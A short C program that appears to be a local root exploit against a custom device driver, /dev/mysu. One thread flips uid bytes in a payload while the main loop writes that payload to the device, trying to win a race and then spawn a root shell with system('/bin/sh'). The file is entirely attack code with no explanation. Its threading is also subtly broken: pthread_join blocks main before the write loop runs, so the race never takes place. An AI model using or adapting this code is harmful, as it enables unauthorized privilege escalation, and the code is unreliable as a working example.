#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <fcntl.h>
#include <limits.h>
#include <unistd.h>


unsigned char payload[] = {0xe8, 0x03, 0x00, 0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
int stopLoop = 0;    

void *updateToRootUID() {
    while (!stopLoop) {
        payload[0] = 0x00;
        payload[1] = 0x00;

        int uid = getuid();
        if(uid == 0) {
            stopLoop = 1;
            printf("We are now root.\n");
            system("/bin/sh");
        }
    }

    return 0;
}

void readFromDevice(int device_fd) {
    unsigned char buff[32];
    ssize_t bytes_read = read(device_fd, buff, 32);
    printf("We read: %zd\n", bytes_read);
    for (int i = 0; i < bytes_read; i++) {
        printf("%02x ", buff[i]);
    }

    printf("\n");
}

int main() {

    pthread_t rootThread;
    pthread_create(&rootThread, NULL, updateToRootUID,NULL);
    pthread_join(rootThread, NULL);

    const char *device_path = "/dev/mysu";
    ssize_t payload_length = sizeof(payload);

    while (!stopLoop) {
        int device_fd = open(device_path, O_RDWR);
        payload[0] = 0xe8;
        payload[1] = 0x03;
        write(device_fd, payload, payload_length);
        close(device_fd);
        int uid = getuid();
        if(uid == 0) {
            stopLoop = 1;
            printf("We are now root.\n");
            system("/bin/sh");
        }
    }

    return 0;
}
